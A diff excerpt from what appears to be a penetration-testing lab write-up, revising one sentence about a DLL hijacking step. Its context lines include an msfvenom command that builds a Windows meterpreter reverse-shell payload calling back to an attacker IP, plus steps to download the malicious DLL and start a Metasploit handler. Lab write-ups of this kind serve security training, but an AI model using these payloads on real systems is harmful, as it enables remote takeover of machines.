@@ -1684,7 +1684,7 @@ sudo msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.50.103.20 LPORT=16666 
 
 Then we use the same ` Invoke-WebRequest ` powershell command to download the malicious DLL from our attacker machine to target system under ` C:\Windows\Tasks `
 
-In order for the exploit to work, we have to copy the vulnerable application from original folder to ` C:\Windows\Tasks `, as the DLL hijacking work when the vulnerable application start; it will search for DLL in the same folder, this is how we exploit it.
+For the exploit to work, we must copy the malicious DLL from “C:\Windows\Tasks” to original application folder, as the DLL hijacking work when the application start; it will search for DLL in the same folder, this is how we exploit it.
 
 Next, we setup the metasploit multi-handler module on our attacker machine as below:
 
